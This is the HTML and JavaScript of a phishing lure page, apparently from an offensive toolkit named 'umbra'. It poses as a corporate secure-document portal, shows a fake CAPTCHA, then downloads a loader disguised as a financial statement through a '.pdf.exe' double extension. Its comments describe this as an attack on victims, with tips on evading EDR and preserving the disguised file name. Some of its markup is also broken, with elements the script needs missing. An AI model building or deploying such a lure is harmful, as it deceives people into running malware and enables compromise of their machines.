<!DOCTYPE html>
<!--
  phish.html - umbra delivery lure (English).

  This is the page the target lands on (served by the Kali origin through the
  Cloudflare Tunnel as https://c2.example.com/). It looks like a corporate
  "secure document portal", shows a fake bot-check, and on success downloads the
  delivery artifact (default: the disguised loader.exe copy staged by
  scripts/build.sh as PAYLOAD_NAME; the .lnk built by make_lnk_payload.sh also
  works - just point CONFIG at it).

  Edit ONLY the CONFIG object at the top of the <script> block below:
    PAYLOAD_URL   - path of the delivery file on this server
    PAYLOAD_NAME  - file name the browser saves it as
    VERIFY_DELAY  - fake captcha delay in ms

  NOTE: no web page can execute a downloaded file - modern browsers have no
  ActiveXObject/WScript.Shell, block file:// navigation, and sandbox the
  download. The victim must double-click the saved file (one click, same as
  with the .lnk). This page just controls WHAT gets downloaded.

  NOTE: The delivery file is a plain same-origin anchor (no Blob), so the
  browser keeps the exact file name. scripts/serve.py also sends
  Content-Disposition: attachment so the name is pinned server-side. Browsers
  may still attach Mark-of-the-Web (Zone.Identifier) to the download; see the
  README troubleshooting section. This page has no other purpose and performs
  no credential capture and no clipboard/ClickFix prompt.
-->
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SecureVault &middot; Document Portal</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%2312305c'/%3E%3Cpath d='M16 7l7 3v5c0 4.4-2.9 8.1-7 9-4.1-.9-7-4.6-7-9v-5l7-3z' fill='none' stroke='%23fff' stroke-width='2' stroke-linejoin='round'/%3E%3C/svg%3E">
<style>
  :root { color-scheme: light; --brand:#12305c; --brand2:#17408a; --ink:#1c2430; --mut:#667386; --line:#e2e7ef; --ok:#1a9e5c; }
  * { box-sizing: border-box; }
  html, body { height: 100%; }
  body {
    margin: 0; min-height: 100vh; display: grid; place-items: center;
    font-family: "Segoe UI", system-ui, -apple-system, Arial, sans-serif;
    background: #eef1f6; color: var(--ink);
  }

  /* --- decorative blurred "document" background --------------------------- */
  .bg { position: fixed; inset: 0; filter: blur(6px) saturate(1.05); opacity: .55; pointer-events: none; }
  .bg .doc {
    position: absolute; width: 300px; height: 380px; background: #fff; border-radius: 10px;
    box-shadow: 0 18px 50px rgba(20,30,50,.18); padding: 22px;
  }
  .bg .doc::before { content: ""; display: block; height: 12px; width: 55%; background: #12305c; border-radius: 3px; }
  .bg .doc::after  {
    content: ""; position: absolute; left: 22px; right: 22px; top: 56px; bottom: 22px;
    background: repeating-linear-gradient(#eef1f6 0 9px, transparent 9px 22px);
  }
  .bg .d1 { top: 6%;  left: 8%;  transform: rotate(-7deg); }
  .bg .d2 { top: 40%; left: 46%; transform: rotate(4deg); }
  .bg .d3 { top: 12%; right: 6%; transform: rotate(9deg); }
  .scrim { position: fixed; inset: 0; background: linear-gradient(180deg, rgba(238,241,246,.35), rgba(238,241,246,.8)); pointer-events: none; }

  /* --- card ---------------------------------------------------------------- */
  .card {
    position: relative; width: min(500px, 92vw); background: #fff; border-radius: 14px;
    box-shadow: 0 18px 55px rgba(20,30,50,.20); overflow: hidden; z-index: 2;
  }
  .head { padding: 20px 26px; background: var(--brand); color: #fff; display: flex; align-items: center; gap: 12px; }
  .head .logo { width: 34px; height: 34px; border-radius: 8px; background: rgba(255,255,255,.14); display: grid; place-items: center; flex: none; }
  .head .logo svg { width: 20px; height: 20px; }
  .head .brand { font-weight: 600; font-size: 17px; letter-spacing: .2px; line-height: 1.15; }
  .head .brand small { display: block; font-weight: 400; font-size: 11.5px; opacity: .8; margin-top: 2px; }

  .body { padding: 22px 26px 8px; }
  .doc {
    display: flex; align-items: center; gap: 14px; padding: 14px 16px;
    border: 1px solid var(--line); border-radius: 10px; background: #fbfcfe;
  }
  .doc .icon {
    width: 42px; height: 50px; flex: none; border-radius: 5px;
    background: linear-gradient(180deg,#e2352b,#c62828); position: relative;
    display: grid; place-items: center; box-shadow: 0 3px 8px rgba(200,40,40,.28);
  }
  .doc .icon::after {
    content: "PDF"; position: absolute; bottom: 6px; left: 0; right: 0;
    text-align: center; color: #fff; font-size: 10px; font-weight: 700; letter-spacing: .5px;
  }
  .doc .icon::before {
    content: ""; position: absolute; top: 0; right: 0; width: 14px; height: 14px;
    background: #fff; border-bottom-left-radius: 4px;
    clip-path: polygon(0 0, 100% 100%, 100% 0);
  }
  .doc .meta .name { font-weight: 600; font-size: 14.5px; word-break: break-word; }
  .doc .meta .sub { color: var(--mut); font-size: 12px; margin-top: 3px; }

  .captcha {
    margin: 18px 0 6px; border: 1px solid #d9dee7; border-radius: 6px;
    background: #f9f9f9; display: flex; align-items: center; gap: 12px;
    padding: 12px 14px; cursor: pointer; user-select: none; transition: box-shadow .15s;
  }
  .captcha:hover { box-shadow: 0 1px 4px rgba(20,30,50,.12); }
  .captcha:focus-visible { outline: 2px solid var(--brand2); outline-offset: 2px; }
  .captcha .box {
    width: 26px; height: 26px; flex: none; border: 2px solid #c2c9d4; border-radius: 4px;
    background: #fff; display: grid; place-items: center; transition: all .15s;
  }
  .captcha .box svg { width: 18px; height: 18px; display: none; }
  .captcha.done .box { border-color: var(--ok); background: var(--ok); }
  .captcha.done .box svg { display: block; }
  .captcha .spin {
    width: 22px; height: 22px; flex: none; border-radius: 50%;
    border: 3px solid #cfd6e0; border-top-color: var(--brand2); animation: spin .8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .captcha .label { font-size: 14px; }
  .captcha .brandcap {
    margin-left: auto; text-align: right; font-size: 9.5px; color: #94a0b0; line-height: 1.25;
  }
  .captcha .brandcap b { display: block; font-size: 11px; color: #7c889a; }

  .actions { margin: 14px 0 4px; }
  .btn {
    display: none; width: 100%; border: 0; border-radius: 9px; padding: 13px 16px;
    background: var(--brand2); color: #fff; font-size: 15px; font-weight: 600; cursor: pointer;
  }
  .btn:hover { background: #123a7d; }
  .btn.on { display: block; }
  .status { font-size: 12.5px; color: var(--mut); margin: 10px 2px 4px; min-height: 18px; }

  .foot {
    padding: 12px 26px 16px; border-top: 1px solid var(--line); margin-top: 10px;
    display: flex; align-items: center; gap: 7px; color: #9aa7b8; font-size: 11.5px;
  }
  .foot svg { width: 12px; height: 12px; }
</style>
</head>
<body>
  <div class="bg" aria-hidden="true">
    <div class="doc d1"></div>
    <div class="doc d2"></div>
    <div class="doc d3"></div>
  </div>
  <div class="scrim" aria-hidden="true"></div>

  <main class="card">
    <div class="head">
      <span class="logo">
        <svg viewBox="0 0 24 24" fill="none"><path d="M12 3l7 3v5c0 4.4-2.9 8.1-7 9-4.1-.9-7-4.6-7-9V6l7-3z" stroke="#fff" stroke-width="2" stroke-linejoin="round"/><path d="M9 12.5l2 2 4-4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </span>
      <div class="brand">
        SecureVault
        <small>Document Portal &middot; signed transfer</small>
      </div>
    </div>

    <div class="body">
      <div class="doc">
        <div class="icon"></div>
        <div class="meta">
          <div class="name" id="docName">2026-Q3_Financial_Statement.pdf</div>
          <div class="sub">2.4 MB &middot; Digitally signed &middot; Expires in 24 hours</div>

      <div class="captcha" id="captcha" role="button" tabindex="0" aria-live="polite" aria-checked="false">

          <svg viewBox="0 0 24 24" fill="none"><path d="M5 12.5l4.5 4.5L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </span>
        <span class="label" id="captchaLabel">I'm not a robot</span>

    <div class="foot">
      <svg viewBox="0 0 24 24" fill="none"><path d="M7 11V8a5 5 0 0110 0v3" stroke="#9aa7b8" stroke-width="2"/><rect x="5" y="11" width="14" height="9" rx="2" stroke="#9aa7b8" stroke-width="2"/></svg>
      Secure connection &middot; bot protection active
    </div>
  </main>

<script>
/*
 * phish.html - browser-only delivery lure for the umbra chain.
 *
 * Flow: the target lands here, ticks the fake "I'm not a robot" box, and after
 * a short delay the page downloads the delivery artifact via a same-origin
 * anchor. Default: the disguised loader.exe copy (PAYLOAD_NAME, staged by
 * scripts/build.sh) - the only thing on disk is the binary the operator already
 * proved passes the EDR; no script interpreter in the chain. The victim still
 * has to double-click the saved file: browsers cannot execute downloads.
 *
 * EDIT THE CONFIG BELOW to match your deployment. Nothing else needs touching.
 */
const CONFIG = {
  // Path of the delivery file on this server (same origin as the page).
  // Default: the disguised loader.exe copy staged by scripts/build.sh
  // (PAYLOAD_NAME there must match this file name).
  PAYLOAD_URL: "/2026-Q3_Financial_Statement.pdf.exe",
  // Saved file name. ".pdf.exe" reads as a PDF under Windows' default
  // "hide extensions for known file types". For the .lnk chain use
  // "/2026-Q3_Financial_Statement.pdf.lnk" + ".pdf.lnk" instead.
  PAYLOAD_NAME: "2026-Q3_Financial_Statement.pdf.exe",
  // Document name shown in the card.
  DOC_NAME: "2026-Q3_Financial_Statement.pdf",
  // Fake "verification" delay in ms before the download starts.
  VERIFY_DELAY: 1200
};

document.getElementById("docName").textContent = CONFIG.DOC_NAME;
document.title = CONFIG.DOC_NAME + " - SecureVault";

const captcha     = document.getElementById("captcha");
const label       = document.getElementById("captchaLabel");
const statusEl    = document.getElementById("status");
const downloadBtn = document.getElementById("downloadBtn");

/* ---- download the delivery file: same-origin anchor (primary) ---------------
 *
 * IMPORTANT: do NOT switch this back to fetch -> Blob -> objectURL. Chromium
 * appends ".download" to Blob downloads whose MIME type has no extension
 * mapping (application/octet-stream + .lnk), which breaks the file name. A
 * plain anchor to the same-origin URL keeps the exact name: the URL itself
 * carries the real extension and scripts/serve.py pins it with
 * Content-Disposition: attachment.
 */
function triggerDownload() {
  const a = document.createElement("a");
  a.href = CONFIG.PAYLOAD_URL;
  a.download = CONFIG.PAYLOAD_NAME; // hint only; the server header wins
  a.rel = "noopener";
  a.style.display = "none";
  document.body.appendChild(a);
  a.click();
  setTimeout(function () { a.remove(); }, 2000);
  statusEl.textContent = "Your document is ready. If your browser asks, keep the file, then open it from Downloads.";
  downloadBtn.classList.add("on");
}

/* Fallback: plain navigation to the file. The server's Content-Disposition
 * header still forces a download with the correct name, so this never produces
 * a ".download" suffix either. */
function directDownload() {
  window.location.href = CONFIG.PAYLOAD_URL;
  statusEl.textContent = "Your document is ready. If your browser asks, keep the file, then open it from Downloads.";
  downloadBtn.classList.add("on");
}

/* ---- fake captcha -> reveal the download ------------------------------------- */
let busy = false;
function runVerification() {
  if (busy || captcha.classList.contains("done")) return;
  busy = true;
  captcha.classList.add("busy");
  document.getElementById("box").outerHTML = '<span class="spin" id="spin"></span>';
  label.textContent = "Verifying...";

  setTimeout(function () {
    const spin = document.getElementById("spin");
    if (spin) {
      spin.outerHTML =
        '<span class="box"><svg viewBox="0 0 24 24" fill="none">' +
        '<path d="M5 12.5l4.5 4.5L19 7" stroke="#fff" stroke-width="3" ' +
        'stroke-linecap="round" stroke-linejoin="round"/></svg></span>';
    }
    captcha.classList.remove("busy");
    captcha.classList.add("done");
    captcha.setAttribute("aria-checked", "true");
    label.textContent = "Verified";
    statusEl.textContent = "Verification complete. Preparing your document...";
    triggerDownload();
    busy = false;
  }, CONFIG.VERIFY_DELAY);
}

captcha.addEventListener("click", runVerification);
captcha.addEventListener("keydown", function (e) {
  if (e.key === "Enter" || e.key === " ") { e.preventDefault(); runVerification(); }
});

downloadBtn.addEventListener("click", function () {
  // Manual retry uses the direct anchor so it always works post-verification.
  directDownload();
});
</script>
</body>
</html>
